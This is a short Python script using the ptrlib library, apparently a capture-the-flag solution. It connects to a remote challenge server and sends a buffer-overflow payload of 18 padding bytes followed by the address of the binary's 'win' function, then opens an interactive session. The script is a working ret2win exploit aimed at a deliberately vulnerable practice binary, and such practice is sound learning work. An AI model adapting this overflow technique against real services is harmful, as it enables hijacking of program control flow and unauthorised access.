from ptrlib import *

FILE_NAME = "./chall"
elf = ELF(FILE_NAME)
io = Socket("nc 34.170.146.252 10485")

payload = b"A" * 18
payload += p64(elf.symbol("win"))

io.sendline(payload)
io.interactive()
